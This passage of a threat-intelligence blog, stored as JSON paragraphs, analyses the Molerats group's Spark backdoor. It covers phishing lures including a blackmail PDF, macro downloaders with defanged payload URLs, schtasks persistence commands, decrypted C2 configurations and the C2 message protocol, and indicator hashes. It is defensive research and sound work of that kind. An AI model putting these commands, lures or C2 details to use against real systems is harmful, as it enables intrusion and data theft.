                "Figure 2 shows the lure image used in an attempt to trick the recipient into clicking the Enable Content button.",
                "These documents were not password-protected, unlike the MOFA delivery documents previously discussed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro is quite simple, as it attempts to download a base64 encoded executable from the following Google Drive URL that it will decode and save to %TEMP%\\rundll64.exe:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://drive.google[.]com/uc?export=download&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoded executable (SHA256: 7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128P) is a compiled AutoIt script that installs an embedded executable to %userprofile%\\runawy.exe and runs it.",
                "Before exiting, the AutoIt script also makes sure the executable will persistently run by copying the executable to the startup directory and by creating a scheduled task by running the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SCHTASKS /Create /f",
                "/SC minute /TN \"runawy\" /mo 5 /tr \"%userprofile%\\runawy.exe\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The runawy.exe file (SHA256:64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431) is a payload packed with Enigma that creates a mutex of S4.4P.",
                "This payload is a packed variant of the Spark backdoor, which has been exclusively linked to Molerats.",
                "We will discuss the Spark backdoors functionality in detail later in this blog, but this specific sample has the following configuration:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"sIt\":\"nysura[.]com\",\"QrU\":\"/\",\"JJDF\":80,\"MJOu\":0,\"TuS\":\"\",\"pJhC\":1,\"Lm\":\"NMRm3AlaGUeT2g9iA2lNTIk04vSj8r2IBUDEvItgOxw=\",\"LPO\":10000}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike the prior two Word documents discussed, we observed a PDF document named Pictures.pdf (SHA256:9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495) attached to an email with a subject of  <redacted>  , which roughly translates from Arabic to Your filthy pictures with Heba.",
                "The PDF document does not attempt to exploit a vulnerability, rather it contains a message meant to coerce the recipient into clicking a link to install the actors payload.",
                "Also, unlike the Word delivery documents that used finesse lure images and missing content in an attempt to trick the user into enabling macros, this PDF document uses a more brash approach that contained a blackmail-esque message in an attempt to trick the user into clicking a link, opening a RAR archive and running an executable."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The message within the PDF document is in Arabic and suggests the sender has compromising pictures of the recipient that they will release to the media.",
                "The message also suggests the document was sent to an associate of a government official and was meant to threaten the victim into clicking a link within the document.",
                "Figure 3 shows the contents within the PDF document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The link within the document is in Arabic and roughly translates to A small sample of your filthy pictures with Heba and Pictures.",
                "The link points to the following URL, which is case sensitive:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://zmartco[.]com/Pictures.rar"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The \"Pictures.rar\" file (SHA256: 1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da) is a RAR archive that contains one file with a filename of     .exe (SHA256: 92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7), which roughly translates to \"This is a few sample photos.exe\".",
                "The executable is a compiled AutoIt script that extracts an embedded executable, saves it to disk at C:\\Users\\Public\\pdf.exe (SHA256: 5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3) and creates a shortcut in Start Menu\\Programs\\Startup\\pdf.lnk to automatically start it each time the system starts, as seen here:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like the runawy.exe payload delivered by the attachment.doc Word document, the \"pdf.exe\" file saved to the system is a packed variant of the Spark backdoor.",
                "This variant of the backdoor had the following configuration:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"xBql\":\"laceibagrafica[.]com\",\"eauy\":\"/\",\"Qnd\":80,\"jJN\":0,\"rlOa\":\"\",\"Eb\":1,\"BGa\":\"vcJbq6nzgJk=\",\"qJk\":10000}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Often when investigating attacks like these, links between infrastructure used across distinct campaigns can be easily found, such as by tracking reused IP addresses or domains, finding related domains sharing similar attributes, and so on.",
                "In the case of all the MOFA-related delivery documents listed in Table 1, servicebios[.]com was the only domain used, and most of the infrastructure information related to historical usage."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the AutoFocus Threat Intelligence service, we used alternative data points provided from our cloud sandbox, WildFire, during the analysis of said malicious documents in order to pivot and discover additional samples and related infrastructure.",
                "In this section we will discuss the methods we used and describe the additional infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4 below is a maltego chart showing the Word documents and Visual Basic Script (vbs) files related to the servicebios[.]com domain in the bottom half of the chart, with some of the related entities connected via one of two links, to other entities in the top half of the chart.",
                "Said links include Yara signatures in the blue box and an AutoFocus query in the orange box, as indicated by the AF for AutoFocus."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The AutoFocus query relates to a specific process execution chain leading to a Windows Scripting Host process (wscript.exe) launching the malicious VBS downloader scripts.",
                "This allowed us to pivot on behavioural artefacts from the MOFA- 101019.doc (SHA256: ddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8) document to previously unknown documents        - 9 - 9 - 2019.doc (Daily report on the most important Palestinian developments, 9-9-2019.doc; SHA256: feec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21) and       - 9 - 9 - 2019.doc (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc; SHA256: bf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As with the original Word document, the VBA macro code inside the new documents also used the open-source code Base64 decode VBS function from Motobit to decode (T1027) the download function and URL to VBS before running it.",
                "The main difference between the VBS files is the domain - dapoerwedding[.]com - where the secondary VBS payload was hosted.",
                "At the time of this activity the domain resolved to 45.15.168[.]118 and was used in a previous campaign from September 2019."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In parallel to searching for related files using behavioural commonalities, we authored Yara signatures for the VBS code associated with the original delivery document, to scan our and VirusTotals corpus.",
                "This led to two additional VBS files: SHA256: 85631021d7e84dc466b23cf77dd949ebc61011a52c1f0fb046cfd62dd9192a15 represents the 1st stage VBS downloader containing minor changes to the domain and filename used, as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://dapoerwedding[.]com/GoogleChrome.vbs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The second VBS file discovered (SHA256: 9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7) is the 2nd stage VBS downloader with reference to the final MSI file payload, which was unavailable at the time of writing:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://dapoerwedding[.]com/GoogleChrome.msi"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were also able to discover additional Word documents using other AutoFocus queries, as highlighted by the two other AutoFocus AF''",
                "orange boxes in Figure X above.",
                "These maltego entities query our data using proprietary hashes calculated from the original documents VBA macro code, and resulted in SHA256: 602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb (servicebios[.]com), and SHA256s: a2c68da1b3e0115f5804a55768b2baf50faea81f13a16e563411754dc6c0a8ff and 4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba (dapoerwedding[.]com)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon initial inspection of dapoerwedding[.]com and servicebios[.]com, nothing stood out as having ties to previously documented Molerats activity, however there were some commonalities (T1347) between the two domains:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another delivery domain - zmartco[.]com - that shares the same commonalities listed above pertains to the Pictures.pdf delivery attachment listed in Table 1 discussed in the previous section."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The executables installed by the compiled AutoIt scripts is a backdoor that Molerats has used in many attack campaigns.",
                "Until recently, this backdoor did not have its own moniker, but Cybereason recently gave this backdoor a name of Spark.",
                "As mentioned in Cybereasons blog, the Spark backdoor was also delivered in attacks occurring in January 2019, as discussed in a blog published by Qihoo 360.",
                "Based on our research, the Spark backdoor has been used by Molerats since at least early 2017, as it was the main payload in the Operation Parliament campaign reported by Kaspersky."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Spark uses HTTP POST requests to communicate with its C2 server to receive commands and to exfiltrate the results, all of which using JSON-structured messages.",
                "In most cases, the threat actors use commercial packers to obfuscate the Spark payload to avoid detection.",
                "During our research, we have seen the actors use the Enigma protector, Themida and VMProtect, which makes identifying samples difficult.",
                "We were also able to identify two different versions of Spark-based identifiers left in the binaries by the developer, which are version 2.2 and 4.2.",
                "Based on the compilation times of the files with the Spark samples with identifiable version strings, it appears that version 2.2 was created in 2017, while version 4.2 was created in late December 2019 and January 2020.",
                "Table 2 shows these Spark samples that contained version numbers, along with their compile time and the packer used to obfuscate their contents."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. Spark samples with their version number, compile time and the packer used"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have collected dozens of Spark payloads, whose compile times range from March 2017 to January 2020, which further suggests this group has been using this backdoor in attack campaigns for almost three years.",
                "We extracted the configurations from each of these files to gather the known C2 domains associated with Spark, which we have included in Table 3."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3. Spark C2 domains and the approximate time they were used"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the next section, we will explain Sparks capabilities and demonstrate its C2 channel that we determined from our analysis of the pdf.exe payload delivered by the Pictures.pdf document in the November 2019 attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Spark payload installed by the compiled AutoIt script is packed with the commercial Enigma protector (T1045).",
                "When packing the payload, the actor used a feature within Enigma protector called Splash Screen, which the actor configured to display an image on top of all the windows and waits for the user to click the image before executing the malicious code.",
                "Figure 5 shows the splash image displayed by the Enigma protector prior to executing the malicious payload, which is a wallpaper image available at wallpaperswide.com.",
                "The splash screen feature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once unpacked, we found the Spark payload was similar to the payloads delivered in Operation Parliament from a capability perspective.",
                "The Spark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload starts by checking the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word \"arabic\".",
                "If the word is not found in the results of these two API calls, the payload does not execute any of its malicious code.",
                "Checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as the actors targeted victim would be configured."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the payload confirms that the system has the appropriate keyboard and language pack installed for the actors desired target, it will begin attempting to communicate with a C2 server specified within a configuration embedded within the payload.",
                "The embedded configuration is encrypted and the payload decrypts it by first using a custom rolling XOR algorithm to decrypt a key and a buffer of ciphertext, resulting in a key and ciphertext that appears encoded with base64.",
                "It will then generate the SHA256 hash of the base64 encoded key and use the fourth through the 28th bytes of the resulting hash as the final key.",
                "The payload will base64 decode the ciphertext and use the final key to decrypt the decoded ciphertext using Triple DES (3DES), which results in a configuration that is structured in JSON.",
                "This particular payload had the keys and values seen in Table 3 below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3. JSON key/value pairs within the payloads configuration"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload also uses this same routine to decrypt an encrypted buffer that contains sleep intervals and more importantly a list of first names used to structure the messages sent to and from the C2 server, as well as the keys used to decrypt these messages.",
                "The payload will use the first names listed in Table 4 as JSON key names and values within messages sent to and received from the C2.",
                "We provide a description of each element of this decrypted buffer in the Appendix, but also show how the names in Table 4 are used within the C2 communications later in this blog.",
                "Each of the values in Table 4 are unique per Spark sample, as the developer changes the names and the keys for each payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 4. First names used by Spark as JSON key/value pairs used for C2 communications"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Before communicating with the C2 server, the payload will decrypt one more buffer that contains strings that the payload uses for debugging messages, as well as the commands it will use to gather system information.",
                "Table 5 shows the strings decrypted and their purpose."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 5.",
                "JSON key/value pairs within a buffer that the payload uses to communicate with C2 server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload communicates with its C2 server laceibagrafica[.]com by issuing HTTP POST requests with base64 encoded and encrypted messages in the data section.",
                "We had not seen any previous explanation of this C2 channel, so we will provide an overview of the back and forth communications between the payload and C2 server to show how this payload uses the names in Table 4.",
                "To do this analysis, we created a C2 server to interact with the Spark payload to issue commands, so all of the HTTP responses in this section are from the C2 server we created and not an actor developed C2 software.",
                "Figure 6 shows an initial beacon sent from the payload to its C2 server.",
                "However, all of the outbound requests from the payload to the C2 will look similar visually, as they all use HTTP POST requests to the same URL with encoded and encrypted messages."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The data section in the initial beacon decodes and decrypts to the JSON message {\"CallieVK\":\"W10=\",\"ReeceWNM\":\"Jessicay\"}.",
                "The JSON message involves two key/value pairs with keys ReeceWNM and CallieVK, whose values transmit the communication type and the data, respectfully.",
                "For instance, the ReeceWNM key includes the name Jessicay that is used to represent the initial beacon communication type.",
                "The payload will decrypt the C2 servers response looking for a EverlyY field and uses the value for a sleep interval before continuing.",
                "Figure 7 shows a response from the C2 server to the initial beacon, of which the response decrypts to {\"EverlyY\": 0}."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After receiving the EverlyY response, the payload will gather system information, specifically the username, hostname and the system specific UUID by running the following command line commands using cmd.exe:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will store each of these command results in JSON in base64 encoded ciphertext within a field name ZaydenlnL and using the first name AngelxEv to represent the type of data, which is a number that corresponds to the results in the list above with 1 representing the UUID, 2 the hostname and 3 the username.",
                "These three JSON objects are added to a JSON array with a name of Maximiliano and sent to the C2 server.",
                "For example, the payload stores the system information in JSON as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"Maximiliano\":[{\"AngelxEv\":1,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertext of UUID>\"},{\"AngelxEv\":3,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertext of username>\"},{\"AngelxEv\":2,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertext of hostname>\"}]}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will create an outbound communications JSON object by setting the encoded system information JSON to the CallieVK value and setting the ReeceWNM value to the communication type JoslynKe.",
                "The resulting JSON will resemble the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"CallieVK\":\"<base64 encoded ciphertext of system information Maximiliano JSON array>\",\"ReeceWNM\":\"JoslynKe\"}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The resulting JSON object is base64 encoded, encrypted and sent within the HTTP POST data to the C2 server, as seen in the example request in Figure 8."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After sending the system information, the payload will expect to receive a command from the C2 server within the response.",
                "Figure 9 shows the response to this request that contains encrypted data that the payload will parse for commands to execute."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload does not have a command handler.",
                "Rather, it will process the JSON object within the C2s response for applications to open and/or command line commands to run by calling the CreateProcessW API function.",
                "The expected JSON object contains an array named Jordanlzw that has one or more objects that will have a task identifier number in a field Ivory, an application name to run in a Alanih field, and the command line arguments to pass to the application in a TrumanRd field.",
                "For instance, the decrypted response in Figure 9 contains a JSON object would instruct the payload to run c:\\windows\\system32\\cmd.exe using the command line argument /c whoami, which effectively runs the whoami command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"Aryana\": 0, \"Jordanlzw\" :[{\"Ivory\" : 5, \"Jonas\" : true, \"Reginacy\" : false, \"TrumanRd\" : \"/NKg0zJdCDP1XlK9NJ4eJA==\", \"Alanih\" : \"i8KOnxchf86h8NKfF45XMETHhwTx6yF3AfMoWzyG9wA=\", \"LondonzO\" : true}]}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After running the command provided by the C2, the payload will send a message to the C2 server that we believe is meant to notify the C2 that it received the command by sending the specific task identifier to the server.",
                "The payload will notify the C2 using the communication type \"MorganE\" as seen in the following JSON:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"CallieVK\":\"eyJKYXNlTiI6W3siTGF3cmVuY2UiOjV9XX0=\",\"ReeceWNM\":\"MorganE\"}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoded data within the CallieVK field will contain a JSON array with a name of JaseN that contains one or more objects with a field name of Lawrence that contains the task numbers received, such as {\"JaseN\":[{\"Lawrence\":5}]}.",
                "This acknowledgement is sent to the C2 server, as seen in Figure 10:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After acknowledging the receipt of command, the payload expects the C2 to respond with a JSON object with the Allier field set to a number, such as {\"Allier\" : 7}.",
                "We are unsure of the purpose of this transmission or how the payload uses this number value, but Figure 11 shows the base64 encoded ciphertext containing the Allier field."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After receiving the Allier JSON object, the payload will send the results of the executed command(s) to the C2 server.",
                "The payload will create a JSON object with an array named Zeke, which will contain JSON objects that have a FrederickT field used to store the result of the command, a ReesefP field to denote the task identifier, and a KaileeXws field to store a boolean if the command was successful.",
                "The resulting JSON would look like the following when the result of the whoami command issued by the C2 is test-system\\<redacted>:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"Zeke\":[{\"FrederickT\":\"5yUu16Ae8WKt<redacted>\",\"KaileeXws\":true,\"ReesefP\":5}]}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will base64 encode this data and set the CallieVK field in the outbound JSON object with the ReeceWNM field set to the Winston communication type, as seen in the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"CallieVK\":\"eyJaZWtlIjpbeyJGcmVkZXJpY2tUIjoiNXlVdTE2QWU4V0t0aX<redacted>0iLCJLYWlsZWVYd3MiOnRydWUsIlJlZXNlZlAiOjV9XX0=\",\"ReeceWNM\":\"Winston\"}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will then encrypt this JSON object and send it to the C2 server to exfiltrate the results of the issued command.",
                "Figure 12 shows the HTTP POST request containing the encrypted JSON object that contains the Winston communication type."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After sending the results of the initial commands, the payload expects the C2 to reply with a JSON object with a Garrison field set to a number, such as {\"Garrison\" : 8}.",
                "Figure 13 shows the C2 server responding with ciphertext of the JSON object with the Garrison field."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This concludes the check-in and initial command execution portion of the C2.",
                "The payload will enter a loop to continuously send HTTP requests to obtain additional commands to run using the same sequence of JSON objects previously explained starting after the JoslynKe communication type that sent the system information to the C2.",
                "Instead of sending the system information to the C2 and parsing the response for a command, each iteration of this loop will start with a communication type of VanessaFM as seen here:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"CallieVK\":\"eyJBZGVsaW5lUkQiOiJ2Y0picTZuemdKaz0iLCJBdmVyaXp0IjoiMSIsIkJyYW5kZW50bEsiOjEsIk1hdGhpYXNOYm8iOlt7IkFkYWx5bm5nUyI6MSwiQ29sbGluc1BNIjoiS1Q2TloyMVNGTVQ5WHFuZVM3MjJmZkVucG1FUFVZcDBqcDFFTXRaVEtyUmNNWkVFWG56QnZnPT0iLCJOZXZhZWgiOnRydWV9XX0=\",\"ReeceWNM\":\"VanessaFM\"}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The data in the CallieVK field decodes to a JSON object that has several fields, one of which is an array called MathiasNbo that contains JSON objects that transmit the UUID for the compromised system in a field named CollinsPM that was previously transmitted to the C2 in the ZaydenlnL field of the JoslynKe communication type.",
                "The JSON object also contains a field AdelineRD that contains a nickname or campaign identifier value in the form of base64 encoded ciphertext.",
                "We have compiled a list of campaign codes of known Spark payloads, which we have included in the Appendix.",
                "The resulting JSON object will look like the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{\"AdelineRD\":\"vcJbq6nzgJk=\",\"Averizt\":\"1\",\"BrandentlK\":1,\"MathiasNbo\":[{\"AdalynngS\":1,\"CollinsPM\":\"\"<base64 encoded ciphertext of UUID seen in ZaydenlnL field>\",\"Nevaeh\":true}]}"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This JSON is encrypted and base64 encoded and sent to the C2 server, as seen in Figure 14.",
                "The payload will use the same JSON each iteration of the main loop and will expect the C2 to provide the same sequence of responses as discussed before that contain Jordanlzw, Allier, and Garrison fields to receive additional commands."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While collecting additional Spark samples, we found samples from a 2019 campaign and newer samples that were compiled in January 2020 used in the Spark Campaign.",
                "The delivery documents and Spark payloads used in these campaigns differ from the delivery document we observed in the October and November 2019 attacks.",
                "At a high level, the January 2019 delivery document was self-contained as it had its payload embedded within it, while the October 2019, November 2019 and January 2020 delivery documents required interacting with a remote server.",
                "The October 2019 and January 2020 documents differ as the former attempts to download a VBScript that downloads a payload from the actor controlled server, whereas the January 2020 document attempts to load a remote template from Google Drive whose macro attempts to download a payload from Google Drive.",
                "The known Spark payloads installed by each of these delivery documents differ as well, which we will compare with the known payload from the November attack discussed earlier in this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We analyzed a delivery document from the 2019 campaign and found that it was a macro-enabled Word document (SHA256:40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11).",
                "The macro made the decoy contents by setting a textbox in the document to visible with the line Shapes(\"textbox1\").Visible = True, while the attacks discussed earlier in this blog did not attempt to display any updated decoy contents.",
                "Another marked difference is that while both the January and October 2019 delivery documents wrote to a secondary VBScript %userprofile%\\wmsetup.vbs and programdata\\Micorsoft\\Microsoft.vbs respectively, the wmsetup.vbs script contains the binary payload while Microsoft.vbs attempts to download another VBScript that will download the binary payload.",
                "The wmsetup.vbs script decodes an embedded base64 encoded payload (SHA256:9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "), saves it to %temp%\\ihelp.exe and creates a scheduled task for persistence by running the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "schtasks /create /f",
                "/sc minute /mo 1 /tn ihelp /tr %temp%\\ihelp.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A few notable characteristics of the Spark payload delivered in January 2019 include the use of different freely-available libraries from other known samples, such as using the msgpackv1 library instead of JSON to structure its configuration and C2 communications, as well as using the SFML library instead of cURL.",
                "Also, unlike the Spark payload delivered in November 2019, this payload uses the AES cipher to decrypt its configuration and other pertinent strings and to encrypt and decrypt network communications with its C2.",
                "It uses the entire SHA256 hash of a supplied key string without using the custom rolling XOR cipher on the key and ciphertext as discussed earlier in this blog.",
                "The decrypted configuration from this payload structured using msgpack appears as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\x88\\xa4jevG\\xadsmartweb9[.]com\\xa3JRk\\xa1/\\xa3ufRP\\xa4qNxp\\x00\\xa4kfds\\xa0\\xa4WjaS\\x01\\xa3WnF\\xb8OMfX5GiCmOICUvhunB2lWQ==\\xa3sRF\\xcd'\\x10"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also analyzed a delivery document from the 2020 Spark campaign (SHA256:8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8) and it differed from both the January and October 2019 delivery documents.",
                "First, the initial delivery document did not contain a macro, rather it attempts to load a remote template from Google Drive, specifically at the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://drive.google.com/uc?export=download&d=1NbCEnL-jA89PWBEhLWwHmBM5nmUKNRS8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The remote template (SHA256:a0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367) contains a macro that attempts to download an executable from the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxs://drive.google.com/uc?export=download&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The executable hosted at the Google Drive link (SHA256:7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128) is a compiled AutoIt script that attempts to install a Spark backdoor to %userprofile%\\runawy.exe, which is the same exact dropper and payload as we observed installed by the attachment.doc delivery document discussed earlier in this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 6 shows a comparison of features in the Spark payloads discussed in this section.",
                "Unfortunately, we were unable to obtain the payload installed by the MOFA-related Word documents delivered in the October 2019 attacks.",
                "If we compare the Spark samples installed by the delivery documents in January 2019 and 2020 with the Spark sample installed by the Pictures.pdf delivery document in November 2019, we see notable differences that suggest this threat group is continually developing this backdoor."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 6.",
                "Comparison of Spark payloads delivered in January 2019, October 2019, November 2019 and January 2020"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Kasperskys report mentioned the sub-groups of Molerats (AKA the Gaza Cybergang) are responsible for the Operation Parliament campaign that delivered the Spark payload and we observed this threat group delivering the Downeks in the DustySky campaign.",
                "We observed some similarities between Spark and Downeks from a development and installation perspective."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For instance, we observed the same binder Trojan, which is a malicious application used to open a decoy document and to install a payload, one installing a Downeks payload and two others installing Spark.",
                "The binder Trojan installing Downeks was compiled in December 2015 and was used during the DustySky campaign as mentioned in our blog (SHA256: 75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9), while we have two samples of this binder Trojan installing Spark samples that were compiled in November 2017 (SHA256:4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85) and April 2018 (SHA256:23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "From a development perspective, both the Downeks and Spark payloads use libraries and code from several open-source projects available on GitHub to carry out its C2 communications and to structure data in JSON.",
                "First, Spark uses the cURL library for C2 communications, specifically version 7.56.0-DEV whose source code is available on GitHub, while Downeks (SHA256:9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7) used cURL to communicate with the C2 server, but an earlier version (7.39.0).",
                "Second, the payload uses JSON to parse its configuration and to structure its messages sent to and from the C2 server, which it uses JSON for Modern C++ Version 2.1.1 also available on GitHub.",
                "The previously mentioned Downeks also used JSON to parse its configuration and to structure the data it sends and receives from its C2 server.",
                "However, it used Tencents RapidJSON again freely available on GitHub.",
                "This fits our previous observations of the developer of Spark using different JSON libraries within different versions of Spark."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Molerats, also known as the Gaza Hacking Team and the Gaza Cybergang, has been targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries between October 2019 through the beginning of December 2019.",
                "This group uses spear-phishing emails to deliver both malicious Word and PDF documents, and attempts to social engineer the victim into an infection rather than trying to exploit a software vulnerability.",
                "Also, the group uses the Spark backdoor in attacks, but continues to develop this tool using different freely available libraries to structure important data and to carry out C2 communications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from the attacks discussed in this blog by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d19104ef4f443e80c21375f1b779f00c960e0193e8aade69d7ad87a11f39c897",
                "- MOFA- 031019.doc\ndc3311b3a827840c25689c0e153f2c09ba9583bcf18cdc43b88b12cf9846e94b - Microsoft.vbs\nc45b5b01e1c3284fd694db6aa0ebeab8abe78d9bb12eb41b957cd121d97b3516 - PlayerVLC.vbs\n03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506 - MOFA- 061019.doc\n725d907b33cca8cec22f561068a3a8abf3616a8e2f452adb7fbd4aec20390f06 - Microsoft.vbs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000 - attachment.doc\n7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128 - rundll64.exe\n64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431 - runawy.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495 - Pictures.pdf\n1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da - Pictures.rar\n92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7 -     .exe\n5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3 - pdf.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ee9f90819a578c8256fc950f62bd9f7b051edbee06618a26fa21c2875c3c301e -   973    (Note No. 973 Government List c)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7 - GoogleChrome.vbs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8 - MOFA- 101019.doc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
